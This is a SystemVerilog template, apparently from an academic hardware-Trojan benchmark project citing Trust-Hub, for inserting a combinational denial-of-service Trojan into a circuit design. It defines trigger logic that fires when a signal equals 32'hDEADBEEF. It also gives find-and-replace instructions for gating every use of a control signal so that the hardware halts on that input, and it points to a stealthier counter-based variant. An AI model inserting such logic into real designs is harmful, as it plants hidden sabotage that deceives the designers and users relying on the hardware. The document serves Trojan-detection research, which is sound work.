/**
 * Combinational DoS Trojan - Code Snippet
 * 
 * Trust-Hub Category: Denial of Service ✓ (Verified)
 * Trust-Hub Benchmarks: AES-T1800, AES-T1900, AES-T500, BasicRSA-T200
 * 
 * Description:
 *   Disables a control signal combinationally when a specific input
 *   pattern is detected. No clock needed - trigger fires immediately
 *   whenever {{TRIGGER_SIGNAL}} matches the magic pattern.
 *   AES-T1800: forces AES operation to halt on specific key value.
 *   
 * NOTE: This is for COMBINATIONAL modules only (no clock/registers).
 *       For sequential modules, use the sequential/dos_template.sv instead
 *       which uses a counter-based trigger for better stealth.
 *
 * Trigger: Pattern match on {{TRIGGER_SIGNAL}}
 * Payload: Block {{PAYLOAD_SIGNAL}} when pattern detected
 *
 * Author: Sharjeel Imtiaz (TalTech)
 * Date: January 2026
 */

// ============================================================
// TROJAN TRIGGER LOGIC (Combinational - immediate pattern match)
// ============================================================

// Magic value that activates the trojan
localparam logic [31:0] TRIGGER_PATTERN = 32'hDEADBEEF;

// Trojan fires instantly whenever trigger signal equals magic pattern
wire trojan_active;
assign trojan_active = ({{TRIGGER_SIGNAL}} == TRIGGER_PATTERN);

// ============================================================
// PAYLOAD MODIFICATION INSTRUCTIONS
// ============================================================
// DoS Attack: Block {{PAYLOAD_SIGNAL}} combinationally when trojan fires.
//
// Integration Script Must:
//   Find all conditions using {{PAYLOAD_SIGNAL}}, e.g.:
//     if ({{PAYLOAD_SIGNAL}}) begin
//     assign output = {{PAYLOAD_SIGNAL}} & other;
//
//   Replace each with:
//     if ({{PAYLOAD_SIGNAL}} && !trojan_active) begin
//     assign output = ({{PAYLOAD_SIGNAL}} && !trojan_active) & other;
//
// Manual Example (combinational ALU enable):
//   Find:    assign result_valid = {{PAYLOAD_SIGNAL}} & op_done;
//   Replace: assign result_valid = ({{PAYLOAD_SIGNAL}} && !trojan_active) & op_done;
//
// Effect: When {{TRIGGER_SIGNAL}} == 32'hDEADBEEF:
//   trojan_active = 1 combinationally (no delay)
//   {{PAYLOAD_SIGNAL}} is forced to 0 regardless of actual value
//   Result: Instant Denial of Service on magic input pattern!